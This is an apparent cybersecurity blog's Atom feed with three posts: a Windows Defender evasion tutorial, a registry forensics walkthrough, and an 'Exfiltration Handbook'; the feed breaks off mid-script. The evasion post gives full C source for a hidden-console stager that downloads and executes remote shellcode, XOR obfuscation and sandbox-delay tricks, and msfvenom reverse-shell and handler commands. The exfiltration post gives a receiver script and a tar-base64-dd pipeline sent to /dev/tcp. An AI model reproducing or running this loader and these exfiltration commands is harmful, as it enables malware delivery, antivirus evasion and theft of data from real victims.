<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2026-01-31T14:15:47-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><entry><title type="html">Msfvenom Is Not Dead</title><link href="/blog/AV-Evations" rel="alternate" type="text/html" title="Msfvenom Is Not Dead" /><published>2026-01-30T00:00:00-05:00</published><updated>2026-01-30T00:00:00-05:00</updated><id>http://localhost:4000/blog/AV-Ev</id><content type="html" xml:base="/blog/AV-Evations"><![CDATA[<p>You’ve definitely run msfvenom, uploaded the payload, and watched it get nuked instantly by Windows Defender. It’s frustrating. It makes you think Msfvenom is useless or outdated.</p>

<p>So I was thinking about a different way to keep using msfvenom these days, and I found one. Today, I’m going to show you that the tool isn’t the problem the delivery method is. By taking a ‘flagged’ raw payload and wrapping it in a custom C loader with simple XOR encryption, we can bypass static analysis and pop a calculator on a fully patched system.</p>

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Terminal">
msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c
</code></pre>
  
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*RgqwqTZWMz-OIvnxD_HA2w.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Now let’s create our own <code class="language-plaintext highlighter-rouge">loader.c</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*DRKqSVzYxjPm5mrcRVF0CA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Unfortunately, antivirus vendors know it better than anyone.</p>

<p>When you compile this C code into an <code class="language-plaintext highlighter-rouge">.exe</code>, the compiler effectively copies and pastes your <code class="language-plaintext highlighter-rouge">char stager[]</code> directly into the <code class="language-plaintext highlighter-rouge">.data</code> section of the executable.</p>

<ul>
  <li>
    <p>The Antivirus scans your new <code class="language-plaintext highlighter-rouge">.exe</code> file. It ignores the C syntax (<code class="language-plaintext highlighter-rouge">int main</code>, <code class="language-plaintext highlighter-rouge">VirtualProtect</code>) and looks at the raw bytes.</p>
  </li>
  <li>
    <p>It finds the exact sequence <code class="language-plaintext highlighter-rouge">\xfc\xe8\x82...</code> sitting inside your executable. Since it already flagged that sequence earlier, it flags your new program immediately. You haven’t changed the “fingerprint” — you just put it in a different container.</p>
  </li>
</ul>

<p>See the example below:</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*F_Y5WUkq5y7Ngntl2GId5w.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<h2 id="video-demonstration">Video Demonstration</h2>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/zymYUL9V4ec" frameborder="0" allowfullscreen="" style="position: absolute; top:0; left: 0; width: 100%; height: 100%;">
  </iframe>
</div>

<h3 id="the-solution-xor-encryption">The Solution: XOR Encryption</h3>
<p>To evade the Static Analysis (Signature) detection, you must make sure the shellcode inside your C file does not look like shellcode until the moment it runs.</p>

<p>We do this by encrypting the shellcode. A simple and effective method for learning is XOR Encryption.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*oeo6dTqaUMnBW_VK6jwKnA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Let’s update our loader too</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*eGox0WO7kXyBLakfXUBUAQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*O65xRfbsH3G0Om1PRUyqTQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Do you think this simple XOR encryption would bypass Windows Defender?</p>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/u-PdD4gxbas" frameborder="0" allowfullscreen="" style="position: absolute; top:0; left: 0; width: 100%; height: 100%;">
  </iframe>
</div>

<h3 id="why-did-it-get-caught">Why did it get caught?</h3>

<p>Modern AVs don’t just read the file they <strong>run it</strong> in a fake, safe environment (a sandbox) for a few seconds to see what happens.</p>

<ol>
  <li>
    <p>When you downloaded/ran your executable, the AV secretly started it in a sandbox.</p>
  </li>
  <li>
    <p>The AV watched your program run the <code class="language-plaintext highlighter-rouge">for</code> loop. It saw the “gibberish” turn back into the dangerous <code class="language-plaintext highlighter-rouge">\xfc\xe8...</code> shellcode.</p>
  </li>
  <li>
    <p>Once the loop finished, the AV scanned the memory, saw the <code class="language-plaintext highlighter-rouge">Meterpreter</code> signature again, and deleted the file.</p>
  </li>
</ol>

<p><a href="https://learn.microsoft.com/en-us/defender-endpoint/adv-tech-of-mdav">Advanced technologies in Microsoft Defender Antivirus</a></p>

<h3 id="how-to-bypass-the-sandbox">How to Bypass the Sandbox</h3>

<p>The AV sandbox has a weakness <code class="language-plaintext highlighter-rouge">time</code>. It cannot analyze every file for 10 minutes it usually gives up after 5–10 seconds to avoid slowing down the user’s computer.</p>

<p>If we can make our program “do nothing” or “waste time” for longer than the AV is willing to watch, the AV will assume the file is safe, quit the sandbox, and let the real program run.</p>

<p>We will add a delay before the decryption happens. <strong>However, standard <code class="language-plaintext highlighter-rouge">Sleep()</code> often doesn’t work</strong> because AVs know how to “fast forward” through a simple sleep command.</p>

<p>Instead, we use a ‘busy wait,’ making the computer do some math that actually takes time to compute.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Yfo3x6fyxQUz298X9lWjZQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Do you think this time would bypass Windows Defender?</p>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/aRQJn9B5X14" frameborder="0" allowfullscreen="" style="position: absolute; top:0; left: 0; width: 100%; height: 100%;">
  </iframe>
</div>

<p>This successfully performed a sandbox bypass.</p>

<h1 id="reverse-shell">Reverse Shell</h1>

<p>Now, let’s get to the real deal: getting a reverse shell, not just popping up a calculator. This time, we will not use encryption.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*vZGONyKEOQJlA_ApeQKuLw.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<h4 id="step-1-generate-the-staged-payload">Step 1: Generate the Staged Payload</h4>

<p>Let’s generate the raw C code for a staged payload.</p>

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Terminal">
msfvenom -p windows/meterpreter_reverse_https LHOST=IP LPORT=8443 -f raw &gt; shellcode.bin

</code></pre>
  
</div>

<h4 id="step-2">Step 2:</h4>

<div class="code-block-container">
  <span class="code-lang-tag">C</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Terminal">
#include &lt;windows.h&gt;
#include &lt;wininet.h&gt;
#include &lt;stdio.h&gt;

#pragma comment (lib, "Wininet.lib")

int main() {

    // 1. Hide Console
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // 2. Setup Connection
    HINTERNET hInternet = InternetOpen(
        "Mozilla/5.0",
        INTERNET_OPEN_TYPE_DIRECT,
        NULL,
        NULL,
        0
    );

    HINTERNET hConnect = InternetConnect(
        hInternet,
        "IP-Addr",
        80,
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        0
    );

    // Flags to prevent caching
    DWORD flags = INTERNET_FLAG_RELOAD |
                  INTERNET_FLAG_NO_CACHE_WRITE |
                  INTERNET_FLAG_PRAGMA_NOCACHE;

    HINTERNET hRequest = HttpOpenRequest(
        hConnect,
        "GET",
        "/shellcode.bin",
        NULL,
        NULL,
        NULL,
        flags,
        0
    );

    // Send request
    if (!HttpSendRequest(hRequest, NULL, 0, NULL, 0)) {
        return 0;
    }

    // 3. Allocate Memory
    char* buffer = (char*)VirtualAlloc(
        NULL,
        4194304, // 4 MB
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );

    // 4. Read Response
    DWORD bytesRead;
    if (InternetReadFile(hRequest, buffer, 4194304, &amp;bytesRead)) {
        if (bytesRead &gt; 0) {
            // 5. Execute shellcode
            int (*shellcode)() = (int(*)())buffer;
            shellcode();
        }
    }

    // Cleanup
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return 0;
}

</code></pre>
  
</div>

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Terminal">
i686-w64-mingw32-gcc https-downloader.c -o APT-Stage.exe -lwininet
</code></pre>
  
</div>

<h4 id="step-3-set-up-the-listener-the-c2-server">Step 3: Set up the Listener (The “C2 Server”)</h4>

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Terminal">
sudo python3 -m http.server 80
</code></pre>
  
</div>

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Terminal">
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter_reverse_https; set LHOST eth0; set LPORT 8443; run"
</code></pre>
  
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*lKwtpe4lUYhCAHGq9mzRZA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/v8enMs1Oexo" frameborder="0" allowfullscreen="" style="position: absolute; top:0; left: 0; width: 100%; height: 100%;">
  </iframe>
</div>
]]></content><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><category term="my-research" /><summary type="html"><![CDATA[<p>You’ve definitely run msfvenom, uploaded the payload, and watched it get nuked instantly by Windows Defender. It’s frustrating. It makes you think Msfvenom is useless or outdated.</p>

]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*wMY1oHvtqyLp2czACLuH4w.png" /><media:content medium="image" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*wMY1oHvtqyLp2czACLuH4w.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Windows Forensics</title><link href="/blog/Windows-Forensics" rel="alternate" type="text/html" title="Windows Forensics" /><published>2026-01-26T00:00:00-05:00</published><updated>2026-01-26T00:00:00-05:00</updated><id>http://localhost:4000/blog/Windows-Forensics</id><content type="html" xml:base="/blog/Windows-Forensics"><![CDATA[<p>One of the Desktops in the research lab at Organization X is suspected to have been accessed by someone unauthorized. Although they generally have only one user account per Desktop, there were multiple user accounts observed on this system. It is also suspected that the system was connected to some network drive, and a USB device was connected to the system. The triage data from the system was collected and placed on the attached VM. Can you help Organization X with finding answers to the below questions?</p>

<blockquote>
  <p>1) How many user created accounts are present on the system?</p>
</blockquote>

<p>Based on the available logs, navigate to <code class="language-plaintext highlighter-rouge">C:\Windows\System32\config\SAM</code>. The SAM hive contains user account, login, and group information, primarily under <code class="language-plaintext highlighter-rouge">SAM\Domains\Account\Users</code>.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*cOWowwnx-k6MLYeF_22hsA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<blockquote>
  <p>2) What’s the password hint for the user THM-4n6?</p>
</blockquote>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*NIsIYnyzuHqy6BD6LxgJRQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<blockquote>
  <p>3) When was the file ‘Changelog.txt’ accessed?</p>
</blockquote>

<p>navigate to <code class="language-plaintext highlighter-rouge">C:\Users\THM-4n6NTUSER.DAT</code> This information is stored in the NTUSER hive and can be found on the following location:</p>

<p><code class="language-plaintext highlighter-rouge">NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*yE1oWyT8moAmW90IimXh0A.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<blockquote>
  <p>4) When was the USB device with the friendly name ‘USB’ last connected?</p>
</blockquote>

<p>The following locations keep track of USB keys plugged into a system. These locations store the vendor id, product id, and version of the USB device plugged in and can be used to identify unique devices. These locations also store the time the devices were plugged into the system.</p>

<p><code class="language-plaintext highlighter-rouge">SYSTEM\CurrentControlSet\Enum\USBSTOR</code></p>

<p><code class="language-plaintext highlighter-rouge">SYSTEM\CurrentControlSet\Enum\USB</code></p>

<p>Registry Explorer shows this information in a nice and easy-to-understand way.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*qT03JA4XyB0so6xUwRxXwA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
]]></content><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><category term="my-research" /><summary type="html"><![CDATA[<p>One of the Desktops in the research lab at Organization X is suspected to have been accessed by someone unauthorized. Although they generally have only one user account per Desktop, there were multiple user accounts observed on this system. It is also suspected that the system was connected to some network drive, and a USB device was connected to the system. The triage data from the system was collected and placed on the attached VM. Can you help Organization X with finding answers to the below questions?</p>

]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*8vIZ7xENqLJqI9C9ZLBKvA.png" /><media:content medium="image" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*8vIZ7xENqLJqI9C9ZLBKvA.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">The Exfiltration Handbook</title><link href="/blog/Data-Exfiltration" rel="alternate" type="text/html" title="The Exfiltration Handbook" /><published>2026-01-24T00:00:00-05:00</published><updated>2026-01-24T00:00:00-05:00</updated><id>http://localhost:4000/blog/Exfiltration</id><content type="html" xml:base="/blog/Data-Exfiltration"><![CDATA[<p>In this guide, I’m breaking down how to “live off the land.” We’re talking about taking standard commands and turning them into tunnels. Whether it’s a quick TCP pipe or a slow-burn DNS play, it’s all about being creative with what’s available.</p>

<h3 id="1-the-udp-socket">1. The UDP Socket</h3>

<p>This is almost identical to the method in your text, but it uses <strong>UDP</strong> instead of TCP. This is useful if the firewall blocks TCP connections but leaves UDP open (often for DNS or media traffic).</p>

<div onclick="togglePerspective(event,this)" style="cursor: pointer; border: 2px solid #ccc; border-radius: 10px; overflow: hidden; margin: 20px 0;">
  
  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*a7G9SaEkrJfqFv4Y2N_FIQ.png" data-label="Attacker (Listener)" data-color="#50fa7b" data-align="left" style="width: 100%; display: block;" />

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*J1uM1b5rD7dDmNAq_jamHg.png" data-label="Victim (Sender)" data-color="#ff5555" data-align="right" style="width: 100%; display: none;" />

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*k6y-TCqAW3ACofhnB74Fiw.png" data-label="Attacker" data-color="#50fa7b" data-align="left" style="width: 100%; display: none;" />

  <div class="perspective-label" style="padding: 10px; background: #282a36; font-weight: bold; color: #ff5555; text-align: left; transition: all 0.3s;">
    Attacker (Listener) <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>
  </div>

</div>

<script>
function togglePerspective(e, container) {
  e.stopPropagation();
  var images = container.querySelectorAll('img');
  var label = container.querySelector('.perspective-label');
  var current = -1;

  for (var i = 0; i < images.length; i++) {
    if (images[i].style.display !== 'none') {
      current = i;
      images[i].style.display = 'none';
      break;
    }
  }

  var next = (current + 1) % images.length;
  images[next].style.display = 'block';

  label.innerHTML = images[next].getAttribute('data-label') + ' <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>';
  label.style.color = images[next].getAttribute('data-color');
  label.style.textAlign = images[next].getAttribute('data-align');
}
</script>

<h3 id="http-exfiltration">HTTP Exfiltration</h3>

<p>sending data as a web request is one of the stealthiest methods. You can use curl or wget, which are installed on most Linux servers.</p>

<div class="code-block-container">
  <span class="code-lang-tag">Python</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="python">
python3 -c '
from http.server import HTTPServer, BaseHTTPRequestHandler
class P(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers["Content-Length"])
        data = self.rfile.read(length).decode()
        with open("exfil.txt", "a") as f:
            f.write(data + "\n")
        print(f"[*] Data saved to exfil.txt")
        self.send_response(200)
        self.end_headers()
HTTPServer(("0.0.0.0", 80), P).serve_forever()
'
</code></pre>
  
</div>

<div onclick="togglePerspective(event,this)" style="cursor: pointer; border: 2px solid #ccc; border-radius: 10px; overflow: hidden; margin: 20px 0;">
  
  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*9ufNbLj6UEi7dmE6F5owaQ.png" data-label="Attacker (Listener)" data-color="#50fa7b" data-align="left" style="width: 100%; display: block;" />

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*4BAW1QhjX07m7w7AFxuTkw.png" data-label="Victim (Sender)" data-color="#ff5555" data-align="right" style="width: 100%; display: none;" />

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*bIx8lsHh_Z4JXZY8qBSRiA.png" data-label="Attacker" data-color="#50fa7b" data-align="left" style="width: 100%; display: none;" />

  <div class="perspective-label" style="padding: 10px; background: #282a36; font-weight: bold; color: #ff5555; text-align: left; transition: all 0.3s;">
    Attacker (Listener) <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>
  </div>

</div>

<script>
function togglePerspective(e, container) {
  e.stopPropagation();
  var images = container.querySelectorAll('img');
  var label = container.querySelector('.perspective-label');
  var current = -1;

  for (var i = 0; i < images.length; i++) {
    if (images[i].style.display !== 'none') {
      current = i;
      images[i].style.display = 'none';
      break;
    }
  }

  var next = (current + 1) % images.length;
  images[next].style.display = 'block';

  label.innerHTML = images[next].getAttribute('data-label') + ' <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>';
  label.style.color = images[next].getAttribute('data-color');
  label.style.textAlign = images[next].getAttribute('data-align');
}
</script>

<h3 id="tcp-socket">TCP socket</h3>

<p>Communication over TCP requires two machines, one victim and one attacker machine, to transfer data.</p>

<p>What is happening here is a pipeline:</p>

<p><code class="language-plaintext highlighter-rouge">Directory → Compressed archive → Text encoding → Obfuscated encoding → Network transfer</code></p>

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>

  
  <div id="interactive-tcp" class="interactive-command">
    <div style="font-size:0.95em; margin-bottom:8px; color:#888;">
      Click any part to see a short explanation
    </div>

    <pre style="background:#0b0c10;color:#f8f8f2;padding:12px;border-radius:6px;overflow:auto;white-space:nowrap;">
      <code>
        <span class="cmd-token" data-key="tar">tar zcf - task4/</span>
        <span class="cmd-sep"> | </span>
        <span class="cmd-token" data-key="base64">base64</span>
        <span class="cmd-sep"> | </span>
        <span class="cmd-token" data-key="dd">dd conv=ebcdic</span>
        <span class="cmd-sep"> &gt; </span>
        <span class="cmd-token" data-key="devtcp">/dev/tcp/{IP}/{PORT}</span>
      </code>
    </pre>

    <div class="cmd-explain-box" style="margin-top:8px;padding:10px;border-radius:6px;background:#f6f6f6;color:#111;font-size:0.95em;min-height:34px;">
      Click a segment for a concise explanation.
    </div>
  </div>

  <style>
    .interactive-command pre { white-space: nowrap; overflow-x: auto; }
    .cmd-token {
      cursor: pointer;
      color: #8be9fd;
      padding: 2px 4px;
      border-radius: 4px;
      display: inline-block;
    }
    .cmd-token:hover { background: rgba(139,233,253,0.08); }
    .cmd-sep { color: #bfbfbf; padding: 0 6px; }
  </style>

  <script>
    (function(){
      const explanations = {
        tar: 'Create a gzip-compressed tar archive and send it to stdout.',
        base64: 'Encode the binary stream into Base64 so it can safely pass through text-only channels.',
        dd: 'Convert the character encoding to EBCDIC (often used for obfuscation).',
        devtcp: 'Send the data stream directly to a remote host via a TCP socket.'
      };

      // Use explicit ID to scope this block reliably
      const container = document.getElementById('interactive-tcp');
      if (container) {
        container.addEventListener('click', function(e){
          const token = e.target.closest('.cmd-token');
          if (!token) return;

          const box = container.querySelector('.cmd-explain-box');
          const key = token.dataset.key;

          box.textContent = explanations[key] || 'No explanation available.';
        });
      }
    })();
  </script>
  
</div>

<p>This command looks complex, but it is really just a chain of simple tools working together. At a high level, it takes a directory, packages it up, slightly disguises the data, and sends it directly to another machine over the network.</p>

<p>Nothing is written to disk. Everything happens as a live data stream.</p>

<p>Each command receives data, transforms it, and passes it along to the next step.</p>

<div onclick="togglePerspective(event,this)" style="cursor: pointer; border: 2px solid #ccc; border-radius: 10px; overflow: hidden; margin: 20px 0;">
  
  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*K1WYiX_clGaRKxAQB12sQQ.png" data-label="Attacker (Listener)" data-color="#50fa7b" data-align="left" style="width: 100%; display: block;" />

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*HeHxMpPbIJ1GWATmhfawSA.png" data-label="Victim (Sender)" data-color="#ff5555" data-align="right" style="width: 100%; display: none;" />

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*su5SrpJxzln85m280PlEUA.png" data-label="Attacker" data-color="#50fa7b" data-align="left" style="width: 100%; display: none;" />

  <div class="perspective-label" style="padding: 10px; background: #282a36; font-weight: bold; color: #ff5555; text-align: left; transition: all 0.3s;">
    Attacker (Listener) <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>
  </div>

</div>

<script>
function togglePerspective(e, container) {
  e.stopPropagation();
  var images = container.querySelectorAll('img');
  var label = container.querySelector('.perspective-label');
  var current = -1;

  for (var i = 0; i < images.length; i++) {
    if (images[i].style.display !== 'none') {
      current = i;
      images[i].style.display = 'none';
      break;
    }
  }

  var next = (current + 1) % images.length;
  images[next].style.display = 'block';

  label.innerHTML = images[next].getAttribute('data-label') + ' <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>';
  label.style.color = images[next].getAttribute('data-color');
  label.style.textAlign = images[next].getAttribute('data-align');
}
</script>

<h3 id="exfiltration-using-ssh">Exfiltration using SSH</h3>

<p>Most organizations allow outbound SSH (Port 22) for administrative purposes. Using a standard, trusted port makes your traffic look like routine maintenance rather than a data breach.</p>

<p>Because the tunnel is encrypted, Deep Packet Inspection (DPI) cannot easily see that you are sending <code class="language-plaintext highlighter-rouge">passwords.db</code> or <code class="language-plaintext highlighter-rouge">company_finances.zip.</code></p>

<p>You don’t always need to install new software; the tools already on the system are often enough for example:</p>

<table>
  <thead>
    <tr>
      <th>Tool</th>
      <th>Primary Use Case</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>SCP (Secure Copy)</td>
      <td>The most straightforward way to copy files over SSH. Best for one-off transfers.</td>
    </tr>
    <tr>
      <td>SFTP</td>
      <td>Useful for interactive sessions where you need to browse the remote file system before pulling data.</td>
    </tr>
    <tr>
      <td>Rsync</td>
      <td>Highly efficient for large datasets; it supports compression and only sends the differences between files.</td>
    </tr>
  </tbody>
</table>

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>

  <div id="interactive-ssh" class="interactive-command">
    <div style="font-size:0.95em; margin-bottom:8px; color:#888;">
      Click any part to see a short explanation
    </div>

    <pre style="background:#0b0c10;color:#f8f8f2;padding:12px;border-radius:6px;overflow:auto;white-space:nowrap;">
      <code>
        <span class="cmd-token" data-key="tar1">tar cf - task5/</span>
        <span class="cmd-sep"> | </span>
        <span class="cmd-token" data-key="ssh">ssh ... "..."</span>
        <span class="cmd-sep"> | </span>
        <span class="cmd-token" data-key="tar2">tar xpf -</span>
      </code>
    </pre>

    <div class="cmd-explain-box" style="margin-top:8px;padding:10px;border-radius:6px;background:#f6f6f6;color:#111;font-size:0.95em;min-height:34px;">
      Click a segment for a concise explanation.
    </div>
  </div>

  <style>
    .interactive-command pre { white-space: nowrap; overflow-x: auto; }
    .cmd-token { cursor: pointer; color: #8be9fd; padding: 2px 4px; border-radius: 4px; display: inline-block; }
    .cmd-token:hover { background: rgba(139,233,253,0.08); }
    .cmd-sep { color: #bfbfbf; padding: 0 6px; }
  </style>

  <script>
    (function(){
      const explanations = {
        tar1: 'The "-" tells tar to send the archive to STDOUT instead of a file.',
        ssh: 'This carries that STDOUT stream securely across the network to the remote host.',
        tar2: 'On the receiving end, "-" tells tar to read from STDIN and extract immediately.'
      };

      // Use explicit ID to scope this block reliably
      const container = document.getElementById('interactive-ssh');
      if (container) {
        const tokens = container.querySelectorAll('.cmd-token');
        tokens.forEach(token => {
          token.addEventListener('click', function(e){
            e.stopPropagation();
            const box = container.querySelector('.cmd-explain-box');
            const key = token.dataset.key;
            box.textContent = explanations[key] || 'No explanation available.';
          });
        });
      }
    })();
  </script>
</div>

<div onclick="togglePerspective(event,this)" style="cursor: pointer; border: 2px solid #ccc; border-radius: 10px; overflow: hidden; margin: 20px 0;">
  
  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*pcT4c33k3tlrP36L6agadg.png" data-label="Victim (Sender)" data-color="#ff5555" data-align="left" style="width: 100%; display: block;" />

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Inyk7UvYkJt30c_RytchdQ.png" data-label="attacker" data-color="#50fa7b" data-align="right" style="width: 100%; display: none;" />

  <div class="perspective-label" style="padding: 10px; background: #282a36; font-weight: bold; color: #ff5555; text-align: left; transition: all 0.3s;">
    Attacker (Listener) <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>
  </div>

</div>

<script>
function togglePerspective(e, container) {
  e.stopPropagation();
  var images = container.querySelectorAll('img');
  var label = container.querySelector('.perspective-label');
  var current = -1;

  for (var i = 0; i < images.length; i++) {
    if (images[i].style.display !== 'none') {
      current = i;
      images[i].style.display = 'none';
      break;
    }
  }

  var next = (current + 1) % images.length;
  images[next].style.display = 'block';

